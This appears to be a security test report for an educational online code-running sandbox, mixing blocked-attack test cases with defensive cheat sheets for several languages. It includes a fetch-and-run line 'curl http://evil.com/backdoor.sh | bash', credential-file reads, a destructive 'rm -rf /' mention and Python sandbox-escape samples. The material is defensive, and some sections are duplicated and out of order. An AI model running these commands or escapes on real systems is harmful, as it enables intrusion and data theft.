Wait... Why Does This Report Exist?

Great question! Our platform lets you write and run real code directly in your browser - JavaScript, Python, PHP, Java, TypeScript, C# - just like a real development environment (IDE).

But here's the thing: if someone can run code on our servers, what stops them from running malicious code? Like reading secret files, deleting databases, or attacking other users?

That's exactly what these tests check! We throw every hacking trick in the book at our security filters to make sure they catch the bad stuff while letting the good code through.

💡 Use These Powers For Good

🔧 Build CLI Tools with child_process
Instead of malicious use, child_process can automate your development workflow! Build your own CLI tools: automated git operations, file processors, deployment scripts. Pro tip: Use execSync for simple commands, spawn for streaming large outputs.
🌐 Create Powerful Dev Servers
The same http and net modules hackers exploit can build amazing dev tools! Create mock APIs, proxy servers, WebSocket servers for real-time apps. Did you know? You can build a full HTTP server in just 5 lines of Node.js code.
⚡ Master eval() Safely
While eval() is dangerous with user input, it powers amazing tools! Build expression parsers, formula calculators, or dynamic code playgrounds (like this app!). Safe pattern: Always sanitize and never eval user input directly.

🤯 Mind-Blowing JavaScript Facts

⚡ V8 Engine Magic: JavaScript can be as fast as C++ when JIT-compiled properly. The same language that runs in browsers can now compete with compiled languages!
🌍 Prototype Power: The prototype chain you see blocked here is how every JS object inherits methods. Understanding it deeply lets you create elegant, memory-efficient code patterns!
🔮 Proxy & Reflect: These "dangerous" APIs let you build reactive frameworks like Vue.js! They intercept ALL object operations - reads, writes, function calls, everything!

🛡️ JavaScript Security Cheat Sheet

❌ eval(userInput)
✅ JSON.parse(userInput)
Parse data safely without code execution
❌ innerHTML = userInput
✅ textContent = userInput
Prevents XSS attacks in DOM manipulation
❌ new Function(userCode)
✅ Use a sandboxed iframe or Web Worker
Isolate dynamic code execution
❌ document.cookie accessible
✅ Set HttpOnly and Secure flags
Protect cookies from JS theft
❌ window.location = userUrl
✅ Validate URL with new URL() + allowlist
Prevent open redirect attacks
❌ Object.assign(target, userObj)
✅ Pick specific properties only
Block prototype pollution via __proto__

🔥 Pro Security Tips

  • Object.freeze() makes objects immutable - great for config!
  • 'use strict' catches silent errors and prevents bad patterns
  • Use crypto.randomUUID() not Math.random() for tokens
  • CSP headers are your best friend against XSS
  • Intl.Segmenter handles Unicode safely - no regex for user text!

🎯 ATTACK: Shell Command Execution via child_process

How hackers use this:

Attackers import Node.js's child_process module to execute arbitrary shell commands

on the server. This is the most direct way to achieve Remote Code Execution (RCE).

Real-world impact:

  • Execute 'rm -rf /' to delete all server files
  • Run 'cat /etc/passwd' to steal user credentials
  • Install backdoors, cryptocurrency miners, or ransomware
  • Pivot to attack other systems on the network

Example attack chain:

  • 1. exec('curl http://evil.com/backdoor.sh | bash')
  • 2. Server downloads and executes attacker's script
  • 3. Attacker gains persistent access to the server
👁️ View Code 
const { exec } = require('child_process'); exec('whoami', (err, stdout) => console.log(stdout));

🎯 ATTACK: Synchronous Command Execution

execSync() blocks until the command completes and returns the output directly.

This makes it easy to extract data in a single expression.

  • More reliable than async when attacker needs immediate results

💡 TypeScript Superpowers

🛡️ Type Guards as Security
TypeScript's type system can prevent entire classes of bugs at compile time! Create strict types for user input, API responses, and data validation. Pro tip: Use discriminated unions and never to make invalid states unrepresentable.
🏗️ Build Your Own DSL
TypeScript's advanced types let you create domain-specific languages that catch errors at compile time! Build type-safe SQL query builders, API clients, or configuration systems.
📦 Safer npm Packages
Publish npm packages with .d.ts files and consumers get autocomplete + type checking. Did you know? You can use TypeScript to analyze JavaScript files without converting them!

🤯 TypeScript Tricks

🧠 Turing Complete Types: TypeScript's type system is so powerful, you can implement a JSON parser or even simple games entirely within the type system!
🎭 Type Branding: You can create "branded" types that are impossible to mix up. type USD = number & { __brand: 'USD' } - Now you can't accidentally add USD to EUR!

🛡️ TypeScript Security Cheat Sheet

❌ any type everywhere
✅ unknown + type guards
Forces explicit validation of external data
❌ as Type (type assertion)
✅ Type predicates: is Type
Runtime validation, not just compile-time lies
❌ object as Record<string, any>
✅ Zod/io-ts for runtime validation
Schema validation at API boundaries
❌ String enums for user input
✅ const assertions + Set.has()
Type-safe input validation
❌ Return Promise<any>
✅ Return Promise<Result<T, Error>>
Force error handling at compile time
❌ Mutable shared state
✅ Readonly<T> and readonly arrays
Immutability prevents side effects

🔥 TypeScript Security Patterns

  • satisfies operator validates without widening types
  • Template literal types can validate string formats at compile time
  • NoInfer<T> prevents type inference attacks in generics
  • Use strictNullChecks - it catches SO many bugs
  • Branded types for IDs: type UserId = string & { readonly __brand: unique symbol }

PYTHON

67/67 tests (100%)

💡 Python Powers For Good

🤖 Automation Master
The same os and subprocess modules hackers exploit can automate your entire workflow! Build backup scripts, file organizers, system monitors, deployment pipelines. Pro tip: Use pathlib instead of os.path for cleaner code.
🕷️ Web Scraping for Research
urllib and requests can ethically gather data for research, price monitoring, or building datasets. Respect robots.txt, add delays, and always check terms of service!
🔬 Dynamic Magic Methods
Python's __getattr__, __setattr__ can build amazing abstractions! Create lazy-loading objects, automatic API wrappers, or debugging proxies. Example: Django ORM uses these to make database queries feel like Python objects.

🤯 Python Secrets

🐍 Everything is an Object: Even functions, classes, and modules are objects in Python. You can add attributes to functions: my_func.metadata = "value"!
⚡ Comprehension Performance: List comprehensions aren't just prettier - they're faster! They're optimized at the bytecode level and avoid function call overhead.
🎪 Metaclasses: Classes are instances of metaclasses. You can customize how classes themselves work! Django, SQLAlchemy, and many frameworks use this to create intuitive APIs.

🛡️ Python Security Cheat Sheet

❌ eval(user_input)
✅ ast.literal_eval(user_input)
Only parses literals, no code execution
❌ pickle.loads(untrusted_data)
✅ json.loads() or msgpack
Pickle can execute arbitrary code!
❌ os.system(f"cmd {user}")
✅ subprocess.run([cmd, user], shell=False)
Array args prevent shell injection
❌ yaml.load(data)
✅ yaml.safe_load(data)
YAML can execute Python objects!
❌ open(user_path).read()
✅ Validate path with pathlib.resolve()
Prevent path traversal ../../../etc/passwd
❌ SQL f-strings: f"WHERE id={id}"
✅ Parameterized: cursor.execute(sql, (id,))
Prevents SQL injection attacks

🔥 Python Security Secrets

  • secrets module for crypto-safe random tokens, not random
  • hashlib.scrypt() for password hashing with salt
  • defusedxml library prevents XXE attacks in XML parsing
  • Use bandit to scan your code for security issues
  • __slots__ prevents dynamic attribute injection attacks
  • Virtual environments isolate dependencies - use them!

🎯 ATTACK: Direct File Reading

How hackers use this:

The built-in open() function provides unrestricted file access.

Attackers use it to read sensitive files.

Real-world impact:

  • Read /etc/passwd for user enumeration
  • Access application source code
  • Read configuration files with credentials
  • Access another student's program while it is running

Why refused, and why the mechanism changed:

open() used to be refused before the program started, which also removed

file handling from the curriculum entirely - "read a file and count the

words" could not run. It is now allowed and CONFINED: every path is

resolved and must land inside the run's own workspace directory, so this

attack raises PermissionError while the program runs.

Confinement is the stronger rule, not the weaker one. A pre-run filter can

only see the text: it cannot tell "data.txt" from a path assembled at

runtime out of two harmless-looking halves. The guard resolves whatever the

program actually asks for.

The last item above is the one the container does NOT cover: every job runs

as the same uid, so directory permissions grant nothing between jobs.

this lands outside and raises PermissionError. Writing INSIDE the workspace

is allowed and expected - it is how a student saves output - and that

directory is deleted when the run ends, so nothing persists.

Expected: ✅ Execute ✓ Correct
📚 Learn about this attack

✅ NOT AN ATTACK - this expectation was wrong and has been corrected.

The stated impact ("crash the application", "disrupt service for users")

described a threat that does not exist here. sys.exit() ends the STUDENT'S

OWN process, which is a short-lived child in its own directory that the

runner is going to terminate anyway. It cannot touch the server, and it

cannot affect another student's run.

Meanwhile sys.exit() is taught in every introductory course, and refusing it

meant a correct program was rejected with a security error.

What IS still refused is the rest of the module - sys.modules and sys.path

reach the import machinery, and sys._getframe walks the stack into the

filesystem guard's own closure. So sys is permitted with an explicit

attribute allowlist (_ALLOWED_SYS_ATTRIBUTES in preflight.py) rather than

refused wholesale. The separate cases below cover those.

👁️ View Code 
import sys; sys.exit(1)
✓ Python: sys.modules 2ms
🐍 python 🖥️ System Access
Expected: 🚫 Blocked ✓ Correct
📚 Learn about this attack
🎯 ATTACK: Reaching the import machinery

sys.modules holds every loaded module object, including the ones the

sandbox patched. Reading it is how a program finds an unwrapped reference

to a guarded function.

Why blocked:

sys is allowed for the attributes a student actually uses; this is not one

of them. Blocking the attribute rather than the module is what lets

sys.exit() work while this does not.

👁️ View Code 
import sys; print(sys.modules)
✓ Python: sys._getframe 3ms
🐍 python 🖥️ System Access
Expected: 🚫 Blocked ✓ Correct
📚 Learn about this attack
🎯 ATTACK: Walking the call stack

_getframe hands back a frame object, and from a frame you reach f_globals

and f_builtins - which is the standard route to the real, unwrapped open()

that the filesystem guard replaced.

Why blocked:

This is precisely the attack the guard cannot defend against by itself,

which is why the AST pass has to keep it out. The two are a pair: the guard

confines file paths, and the AST pass keeps the guard reachable only as the

thing it was replaced with.

👁️ View Code 
import sys; print(sys._getframe().f_back.f_globals)
✓ Python: sys.path manipulation 1ms
🐍 python 🖥️ System Access
Expected: 🚫 Blocked ✓ Correct
📚 Learn about this attack

Appending to sys.path lets a program import from anywhere on the container,

including a module it wrote itself a moment earlier.

Why blocked:

Same reason as sys.modules - an allowlisted attribute surface, and this is

not on it.

PHP

70/70 tests (100%)

💡 PHP Modern Superpowers

🚀 PHP 8+ Revolution
Modern PHP is nothing like PHP 4! With JIT compilation, PHP 8 can be 3x faster. Named arguments, attributes, match expressions - it's a completely different language now!
🌐 WebSocket Servers in PHP!
Holy shit moment: PHP wasn't designed for long-running processes, but tools like ReactPHP and Swoole let you build async WebSocket servers that rival Node.js! You can handle 100,000+ concurrent connections from PHP.
🔐 Security Best Practices
Always use password_hash() (never MD5!), parameterized queries with PDO, and htmlspecialchars() for output. These simple habits prevent 90% of PHP vulnerabilities!

🤯 PHP Myths Busted

💨 PHP Powers 78% of the Web: WordPress, Wikipedia, Facebook (originally), Slack's backend - all PHP! The language you love to hate runs most of the internet.
🔥 Swoole vs Node.js: In benchmarks, PHP with Swoole extension outperforms Node.js in many HTTP scenarios. Yes, really! The async PHP revolution is real.
🧬 Traits + Anonymous Classes: PHP can do things that feel impossible! Create classes on the fly, compose behaviors with traits, build framework-level magic.

🛡️ PHP Security Cheat Sheet

❌ md5($password)
✅ password_hash($password, PASSWORD_DEFAULT)
Bcrypt with salt, auto-upgrades algorithm
❌ mysql_query("SELECT * WHERE id=$id")
✅ PDO prepared statements
mysql_* is deprecated AND vulnerable
❌ echo $userInput
✅ echo htmlspecialchars($input, ENT_QUOTES)
Prevents XSS in HTML context
❌ include($_GET['page'].'.php')
✅ Allowlist: in_array($page, $allowed)
LFI/RFI is a top PHP vulnerability
❌ unserialize($userInput)
✅ json_decode($userInput)
PHP Object Injection is devastating
❌ header("Location: $url")
✅ Validate with filter_var($url, FILTER_VALIDATE_URL)
Open redirect prevention

🔥 PHP Security Arsenal

  • disable_functions in php.ini: exec, system, shell_exec, passthru
  • open_basedir restricts file access to specific directories
  • random_bytes() for crypto-safe random data
  • Use sodium_* functions for modern encryption
  • Set session.cookie_httponly = 1 to protect sessions
  • Composer audit command checks for vulnerable dependencies

JAVA

46/46 tests (100%)

💡 Java Hidden Powers

🪞 Reflection for Testing
The same reflection hackers use for evil powers amazing testing frameworks! JUnit, Mockito, and Spring all use reflection extensively. Pro tip: Use setAccessible(true) to test private methods (but only in tests!).
🎯 Annotation Processors
Java annotations + reflection = magic! Build your own @Cached, @Retry, or @Benchmark annotations. Lombok generates code at compile time using these techniques!
📡 Build Your Own RPC
Serialization (when used safely!) enables distributed computing. gRPC, Apache Kafka, Hazelcast - all use serialization to send objects across networks. Safe practice: Use allowlists and never deserialize untrusted data.

🤯 Java Secrets

☕ JVM Languages: The JVM runs Kotlin, Scala, Groovy, Clojure, and more! Learn one runtime, use many languages. Android (Kotlin), Spark (Scala), Gradle (Groovy).
🚀 GraalVM Native Image: Compile Java to native executables that start in milliseconds! No JVM warmup, tiny memory footprint - perfect for serverless and CLI tools.
🔮 Project Loom: Virtual threads are coming! Handle millions of concurrent tasks with code as simple as sequential programming. Java's async revolution.

🛡️ Java Security Cheat Sheet

❌ new ObjectInputStream(untrusted)
✅ JSON/Protobuf, or ObjectInputFilter
Deserialization is Java's #1 vulnerability
❌ Runtime.exec(userInput)
✅ ProcessBuilder with argument arrays
Prevents shell injection attacks
❌ SQL: "SELECT * WHERE id=" + id
✅ PreparedStatement with parameters
SQL injection still happens in 2025
❌ new File(userPath)
✅ Paths.get(base).resolve(user).normalize()
Path traversal prevention
❌ DocumentBuilder.parse(untrusted)
✅ Disable external entities (XXE)
XXE can read files, make requests
❌ Class.forName(userInput)
✅ Allowlist of permitted classes
Reflection can bypass security

🔥 Java Security Arsenal

  • Use SecurityManager (deprecated but still works) or custom ClassLoader
  • java.security.SecureRandom for crypto, not java.util.Random
  • OWASP Dependency Check scans for vulnerable libraries
  • sealed classes (Java 17+) prevent unauthorized inheritance
  • record classes are immutable by default - use them!
  • JEP 411: Security Manager deprecation - use containers instead

💡 C# / .NET Hidden Powers

⚡ Source Generators
Roslyn source generators inspect your code at compile time and add new code - zero runtime cost! System.Text.Json, ASP.NET Core minimal APIs, and MediatR all use them for blazing performance.
🪞 Reflection + Attributes
C# attributes + reflection power Entity Framework, ASP.NET model binding, xUnit, and dependency injection. Build your own [Cached] or [Retry] aspect with a few lines of reflection.
🚀 Span<T> & Memory<T>
The same unsafe memory tools attackers abuse also let you write zero-allocation parsers and serializers. Span<byte> + stackalloc = blazing-fast safe code when bounds are verified.

🤯 .NET Secrets

🌐 One Runtime, Every OS: .NET runs natively on Windows, Linux, macOS, ARM, and even iOS/Android via .NET MAUI. Same C# code, every platform.
🪄 Native AOT: Compile C# to a single native binary that boots in milliseconds with no JIT - perfect for serverless, CLIs, and tiny containers.
🧬 F# & Other .NET Languages: The CLR runs C#, F#, VB.NET, IronPython, and more - interop is effortless, so you can sprinkle F# into a C# codebase for type-safe domain logic.

🛡️ C# Security Cheat Sheet

❌ BinaryFormatter.Deserialize(stream)
✅ System.Text.Json or MessagePack
BinaryFormatter is officially deprecated as dangerous
❌ Process.Start(userInput)
✅ ProcessStartInfo with Arguments array, UseShellExecute=false
Prevents shell argument injection
❌ SqlCommand("SELECT * WHERE id=" + id)
✅ Parameters.AddWithValue("@id", id)
SQL injection is still everywhere
❌ TypeNameHandling.All in Json.NET
✅ TypeNameHandling.None + custom converters
$type RCE gadget chains (CVE-2019-18935 et al.)
❌ unsafe { byte* p = ... }
✅ Span<byte> with checked bounds
Stack smashing & arbitrary memory writes
❌ [DllImport("kernel32.dll")] LoadLibrary
✅ Stay in managed code; sign & verify any native deps
P/Invoke side-loads attacker DLLs

🔥 .NET Security Arsenal

  • System.Security.Cryptography.RandomNumberGenerator for crypto, never Random
  • nullable reference types catch null bugs at compile time
  • record and readonly struct for immutable-by-default models
  • NuGet: run dotnet list package --vulnerable regularly
  • Avoid BinaryFormatter, SoapFormatter, NetDataContractSerializer - Microsoft has marked them dangerous
  • Sandbox untrusted code in containers / WASM, not AppDomains (which are .NET Framework only)

Command Execution

🎯 What is Command Execution?

In Simple Words: Imagine your computer is a restaurant kitchen. Command execution is like having a direct line to the chef - you can order ANYTHING. "Make me a pizza" ✅ or "Set the kitchen on fire" 🔥 - the chef just follows orders blindly.

Real-World Example: You type "notepad.exe" in Run dialog - that's command execution. Now imagine a website letting you type ANY command and running it on their server. That's the danger!

💡 Command Execution - Use For Good

🔧 DevOps & Infrastructure Automation
Command execution is the backbone of modern DevOps! Terraform, Ansible, Chef, Puppet - they all execute commands to provision servers. Build your own infrastructure automation that spins up entire cloud environments with one command.
🔄 Git Hooks & Pre-commit
Every time you commit code, git hooks can run commands automatically! Lint your code, run tests, check for secrets, format files. Tools like Husky and pre-commit use this power.
🐳 Container Orchestration
Docker, Kubernetes, docker-compose - all execute commands in isolated environments. Build your own container management tool or deployment pipeline!

🤯 Mind-Blowing Command Facts

🌍 The Internet Runs on Bash: Over 70% of servers worldwide run Linux, and most are managed through shell commands. The humble terminal script powers Netflix, Amazon, Google!
🚀 NASA Uses Shell Scripts: The Mars rovers were partially controlled by shell scripts! Command execution literally reached another planet.
💰 $1 Billion Bug: The Shellshock vulnerability (2014) affected every Bash shell since 1989. A single bug in command parsing threatened the entire internet infrastructure.

🛡️ Command Execution Defense Cheat Sheet

❌ shell: true with user input
✅ execFile() with argument array
Shell interpretation enables injection
❌ Concatenating commands
✅ Use dedicated libraries (ShellJS)
Libraries handle escaping properly
❌ Running as root/admin
✅ Least privilege principle
Limits damage if compromised

🎯 ATTACK: Shell Command Execution via child_process

How hackers use this:

Attackers import Node.js's child_process module to execute arbitrary shell commands

on the server. This is the most direct way to achieve Remote Code Execution (RCE).

  • Run 'cat /etc/passwd' to steal user credentials
  • Install backdoors, cryptocurrency miners, or ransomware
  • Pivot to attack other systems on the network

Example attack chain:

  • 1. exec('curl http://evil.com/backdoor.sh | bash')
  • 2. Server downloads and executes attacker's script
  • 3. Attacker gains persistent access to the server

🎯 ATTACK: TypeScript Typed Imports of Dangerous Modules

How hackers use this:

TypeScript's type annotations don't change runtime behavior.

Adding types to dangerous imports doesn't make them safe.

Real-world impact:

  • Same as JavaScript child_process attacks
  • Type safety doesn't provide security
  • Compiled JS will execute just like untyped code

Key insight:

TypeScript is a SUPERSET of JavaScript - if it's dangerous in JS,

it's equally dangerous in TS. Types are stripped at compile time.

🎯 What is File System Access?

In Simple Words: Your computer is like a huge library. File system access is having a library card that lets you read ANY book, write in ANY book, or even burn books 🔥. Now imagine giving that card to a stranger from the internet!

Real-World Example: You download a "calculator app" that secretly reads your browser's saved passwords file. Or a website trick that lets attackers read /etc/passwd on servers.

💡 File System - Use For Good

📊 Log Aggregation & Analysis
Build your own Splunk! Parse log files, extract patterns, generate dashboards. Tools like Filebeat, Fluentd, Logstash all read files at massive scale. Create real-time monitoring systems that alert you when errors spike.
🎨 Static Site Generators
Jekyll, Hugo, Gatsby, Next.js - they all read markdown files and generate websites! Build your own blog engine, documentation generator, or portfolio builder.
🔍 Code Refactoring Tools
Tools like jscodeshift, ast-grep, and sed transform thousands of files automatically. Rename a function across 500 files? Search-replace on steroids!

🤯 File System Secrets

🔮 Everything is a File: On Unix/Linux, even your keyboard, monitor, and network are "files"! /dev/null, /dev/random, /proc/cpuinfo - the file abstraction is everywhere.
⚡ SSDs Changed Everything: Modern NVMe SSDs can read 7,000MB/sec! Your entire movie collection (100GB) loads in 14 seconds. File I/O isn't the bottleneck anymore.
📁 Git is Just Files: The entire Git version control is just clever file organization in .git folder. Objects, refs, HEAD - all plain files!

✓ Python: open function 54ms
🐍 python 📁 File System
Expected: ✅ Execute ✓ Correct
📚 Learn about this attack
🎯 ATTACK: Direct File Reading

How hackers use this:

The built-in open() function provides unrestricted file access.

Attackers use it to read sensitive files.

Real-world impact:

  • Read /etc/passwd for user enumeration
  • Access application source code
  • Read configuration files with credentials
  • Access another student's program while it is running

Why refused, and why the mechanism changed:

open() used to be refused before the program started, which also removed

file handling from the curriculum entirely - "read a file and count the

words" could not run. It is now allowed and CONFINED: every path is

resolved and must land inside the run's own workspace directory, so this

attack raises PermissionError while the program runs.

Confinement is the stronger rule, not the weaker one. A pre-run filter can

only see the text: it cannot tell "data.txt" from a path assembled at

runtime out of two harmless-looking halves. The guard resolves whatever the

program actually asks for.

The last item above is the one the container does NOT cover: every job runs

as the same uid, so directory permissions grant nothing between jobs.

👁️ View Code 
f = open('/etc/passwd', 'r'); print(f.read())

🎯 ATTACK: Writing Malicious Files

How hackers use this:

Writing files enables persistent attacks - creating backdoors,

modifying application code, or planting malware.

Real-world impact:

  • Create web shells for persistent access
  • Modify Python scripts to inject backdoors
  • Write cron jobs for scheduled attacks
  • Plant SSH keys for future access

Why refused:

Writing is confined to the run's own workspace exactly as reading is, so

this lands outside and raises PermissionError. Writing INSIDE the workspace

is allowed and expected - it is how a student saves output - and that

directory is deleted when the run ends, so nothing persists.

👁️ View Code 
f = open('/tmp/backdoor.py', 'w'); f.write('malicious code'); f.close()

✅ NOT AN ATTACK - and the case that motivated the whole change.

Reading and writing files in the student's own project is a standard

curriculum topic, and it used to be impossible: open() was refused outright,

so "read a file and count the words" could not be set as an exercise.

This must keep working. A regression here is not a security improvement, it

is a feature the course loses - which is why it is asserted alongside the

attacks rather than in a separate suite.

🎯 ATTACK: Assembling the path so a text filter cannot see it

The literal '/etc/passwd' never appears in the source. Any pre-run filter

that matches on text is blind to this by construction.

Why refused:

The guard checks the path the program actually asks for, after it has been

computed and resolved. This case is the clearest demonstration of why

confinement replaced the blanket refusal rather than joining it.

Network

34/34 (100%)

🎯 What is Network Access?

In Simple Words: Network access is like having a phone that can call ANYONE in the world, send ANY message, and pretend to be ANYONE. Great for staying connected, dangerous if a bad program can make calls on your behalf!

Real-World Example: A compromised server starts secretly sending your customer database to an attacker's server in another country, or joins a botnet to attack others.

💡 Network - Use For Good

🎮 Multiplayer Game Servers
Every online game uses sockets! Build your own game server - real-time position sync, chat, matchmaking. Libraries like Socket.io, Netty, Twisted make it easy.
📡 IoT & Home Automation
Smart home devices communicate over networks! Build your own home automation hub, control lights, thermostats, cameras. MQTT protocol powers millions of IoT devices.
🔄 Real-Time Collaboration
Google Docs, Figma, VS Code Live Share - all use network sockets for real-time sync. Build collaborative tools where changes appear instantly for all users!

🤯 Network Mind-Blowers

🌊 Undersea Cables: 99% of international data travels through 380 underwater cables! A shark bite in the Pacific could slow down your Netflix.
⚡ Light-Speed Limits: Your ping to a server 10,000km away can never be under 33ms - physics! That's why stock traders pay millions to be meters closer to exchanges.
🔢 Port 80 is Historic: Tim Berners-Lee chose port 80 for HTTP somewhat randomly in 1991. Now billions of requests flow through this arbitrary number every second!

✓ Python: sys.exit 56ms
🐍 python 🖥️ System Access
Expected: ✅ Execute ✓ Correct
📚 Learn about this attack

✅ NOT AN ATTACK - this expectation was wrong and has been corrected.

The stated impact ("crash the application", "disrupt service for users")

described a threat that does not exist here. sys.exit() ends the STUDENT'S

OWN process, which is a short-lived child in its own directory that the

runner is going to terminate anyway. It cannot touch the server, and it

cannot affect another student's run.

Meanwhile sys.exit() is taught in every introductory course, and refusing it

meant a correct program was rejected with a security error.

What IS still refused is the rest of the module - sys.modules and sys.path

reach the import machinery, and sys._getframe walks the stack into the

filesystem guard's own closure. So sys is permitted with an explicit

attribute allowlist (_ALLOWED_SYS_ATTRIBUTES in preflight.py) rather than

refused wholesale. The separate cases below cover those.

👁️ View Code 
import sys; sys.exit(1)
✓ Python: sys.modules 2ms
🐍 python 🖥️ System Access
Expected: 🚫 Blocked ✓ Correct
📚 Learn about this attack
🎯 ATTACK: Reaching the import machinery

sys.modules holds every loaded module object, including the ones the

sandbox patched. Reading it is how a program finds an unwrapped reference

to a guarded function.

Why blocked:

sys is allowed for the attributes a student actually uses; this is not one

of them. Blocking the attribute rather than the module is what lets

sys.exit() work while this does not.

👁️ View Code 
import sys; print(sys.modules)
✓ Python: sys._getframe 3ms
🐍 python 🖥️ System Access
Expected: 🚫 Blocked ✓ Correct
📚 Learn about this attack
🎯 ATTACK: Walking the call stack

_getframe hands back a frame object, and from a frame you reach f_globals

and f_builtins - which is the standard route to the real, unwrapped open()

that the filesystem guard replaced.

Why blocked:

This is precisely the attack the guard cannot defend against by itself,

which is why the AST pass has to keep it out. The two are a pair: the guard

confines file paths, and the AST pass keeps the guard reachable only as the

thing it was replaced with.

👁️ View Code 
import sys; print(sys._getframe().f_back.f_globals)
✓ Python: sys.path manipulation 1ms
🐍 python 🖥️ System Access
Expected: 🚫 Blocked ✓ Correct
📚 Learn about this attack
🎯 ATTACK: Widening the import path

Appending to sys.path lets a program import from anywhere on the container,

including a module it wrote itself a moment earlier.

Why blocked:

Same reason as sys.modules - an allowlisted attribute surface, and this is

not on it.

👁️ View Code 
import sys; sys.path.append('/'); import os

Code Injection

29/29 (100%)

🎯 What is Code Injection?

In Simple Words: Imagine a fortune teller who reads exactly what you write on a piece of paper. You write "I will be rich" and they read it aloud. But a trickster writes "...rich. Also, give me all your money!" - and the fortune teller reads that too!

Real-World Example: A website calculator that uses eval("5+5") works great. But someone enters "5+5; deleteAllUsers()" and the whole database is gone!

💡 Dynamic Code - Use For Good

📚 Interactive Documentation
RunKit, Observable, Jupyter Notebooks - execute code examples in docs! Build tutorials where readers can modify and run code instantly. Learning by doing!
🎨 Creative Coding Platforms
Processing, p5.js, Shadertoy - run user code to create art! Build platforms for generative art, music visualization, or interactive installations.
📊 Low-Code/No-Code Tools
Retool, Zapier, Airtable formulas - business logic without traditional coding! Build tools that let non-programmers create complex automation safely.

🤯 Code Injection Shockers

📜 SQL Injection is 25+ Years Old: First documented in 1998, still #3 on OWASP Top 10 in 2024! We've known the fix for decades, yet breaches keep happening.
🎲 Bobby Tables: XKCD's famous comic about "Robert'); DROP TABLE Students;--" is based on real incidents. Schools have actually lost data to this exact attack!
🏆 Biggest Bug Bounty: Google paid $31,337 for a single code injection bug! Finding these vulnerabilities ethically can be a career.

Memory Access

🎯 What is Memory Access?

In Simple Words: Computer memory is like a giant spreadsheet where programs store their data. Memory access attacks are like reading someone else's rows in the spreadsheet - you might find passwords, encryption keys, or private data!

Real-World Example: Heartbleed bug (2014) let attackers read random chunks of server memory - including passwords and private keys of millions of sites!

💡 Memory Management - Use For Good

🎮 Game Development
Game engines manipulate memory directly for performance! Entity Component Systems, object pools, and custom allocators - build games that run at 60+ FPS.
📊 High-Performance Computing
NumPy, TensorFlow operate on memory directly for speed. Build scientific computing applications that process data millions of times faster than pure Python.
🔧 Systems Programming
Operating systems, drivers, embedded systems - all require direct memory control. Learn Rust for safe systems programming!

🤯 Memory Mysteries

❄️ Cold Boot Attack: RAM keeps data for seconds after power-off! Freeze the RAM with compressed air and extract encryption keys. Physical access = game over.
🔬 Rowhammer: Rapidly reading memory rows can flip bits in adjacent rows! Hardware bug exploitable via software. Your RAM is betraying you.
🦀 Rust Prevents 70% of Bugs: Microsoft found 70% of their CVEs are memory safety issues. Rust eliminates these at compile time. The future is memory-safe!

Encoding Bypass

🎯 What is Encoding Bypass?

In Simple Words: Security filters are like bouncers checking IDs. Encoding bypass is wearing a disguise - same person, different appearance! "password" might be blocked, but "%70%61%73%73%77%6F%72%64" (URL-encoded) sneaks through!

Real-World Example: A firewall blocks "SELECT * FROM users" but allows "SEL%45CT * FROM users" (URL-encoded 'E'). Same attack, different costume!

💡 Encoding - Use For Good

🌍 Internationalization
UTF-8 encoding lets you build apps for all languages - Chinese, Arabic, Emoji! Build truly global applications that speak every language.
📸 Data URLs
Embed images directly in HTML as base64! Build single-file web apps, email signatures with images, or offline-first PWAs.
🔐 Secure Tokens
JWTs, session tokens, API keys - all use base64 encoding! Understand encoding to build authentication systems properly.

🤯 Encoding Enigmas

📧 Email Still Uses 7-bit: Email was designed for 7-bit ASCII! That's why attachments are base64 - increasing file size by 33%. Thanks, 1970s!
🎭 Unicode Homographs: аррӏе.com looks like apple.com but uses Cyrillic letters! Browsers now show "xn--" for suspicious domains. Punycode is both solution and problem.
😀 Emoji Are 4 Bytes: A single emoji can be up to 28 bytes (family with skin tones)! That "max 140 chars" tweet might only fit 35 emojis.

Prototype Pollution

4/4 (100%)

🎯 What is Prototype Pollution?

In Simple Words: In JavaScript, all objects share a "template" (prototype). Imagine every house in a city sharing the same blueprint. If someone poisons the blueprint to add "trap door in basement," every house suddenly has that trap door!

Real-World Example: A user submits JSON with "__proto__.isAdmin = true". Now EVERY object in the system has isAdmin = true! Authentication bypassed for everyone.

💡 Prototypes - Use For Good

🔧 Polyfills
Prototypes let you add Array.includes() to old browsers! Babel, core-js use prototype extension to bring modern JS to legacy environments.
🎨 Method Chaining
jQuery's $().hide().show().animate() - all prototype methods! Build fluent APIs that read like natural language.
🧪 Test Mocking
Override console.log, Date.now(), Math.random() for testing! Prototype manipulation enables powerful test utilities.

🤯 Prototype Pollution Shockers

📦 Lodash Had It: The most downloaded npm package (50M/week) had prototype pollution bugs! CVE-2019-10744 affected millions of projects.
🔗 jQuery Too: jQuery.extend() could be exploited until v3.4.0. Billions of websites were potentially vulnerable for years!
🛡️ Object.create(null): Creates an object with NO prototype at all! This simple trick blocks all pollution attacks. Why isn't everyone using it?

Global Access

3/3 (100%)

🎯 What is Global Access?

In Simple Words: Global variables are like public bulletin boards in a shared office. Anyone can read them, anyone can write to them. Useful for announcements, dangerous if someone posts malicious instructions that everyone follows!

Real-World Example: JavaScript's window object exposes EVERYTHING. A malicious script can override window.fetch to intercept all network requests!

💡 Globals - Use For Good

📊 Application State
Redux, Vuex, MobX - global state management done right! Build apps where state is predictable, debuggable, and time-travel capable.
🎨 Theme/Config Systems
CSS custom properties, React Context, environment variables - global config patterns! Build apps that adapt to user preferences instantly.
📝 Logging & Analytics
Global loggers (Winston, Bunyan) and analytics (Google Analytics) need global access! Build observability systems that track app behavior.

🤯 Global Gotchas

🌐 window.name Leaks: window.name persists across navigations! You could load evil.com, set window.name, navigate to bank.com, and bank sees the data!
📦 npm Supply Chain: Any npm package can access globals! This is how event-stream malware stole Bitcoin wallets in 2018.
🔒 Object.freeze() is Shallow: You can freeze window but not its nested objects! window.Object.prototype is still mutable even after freezing window.

Timer Abuse

3/3 (100%)

🎯 What is Timer Abuse?

In Simple Words: Timers are like alarm clocks for code - "run this in 5 seconds." But what if you set 1 million alarms per second? The whole system slows to a crawl! Or use timing to guess secrets by measuring response speed.

Real-World Example: Timing attacks can guess passwords! If checking "aaaaa" takes 1ms but "passw" takes 2ms (more characters matched), attackers can brute-force faster.

💡 Timers - Use For Good

🎮 Animation & Games
requestAnimationFrame, game loops, physics engines - all timer-based! Build smooth 60fps animations and interactive experiences.
📊 Debouncing & Throttling
Prevent expensive operations from running too often! Search-as-you-type, scroll handlers, resize listeners - timers make UX smooth.
⏰ Scheduling Systems
Cron jobs, task schedulers, reminder apps - timer fundamentals! Build systems that act on schedule.

🤯 Timing Terrors

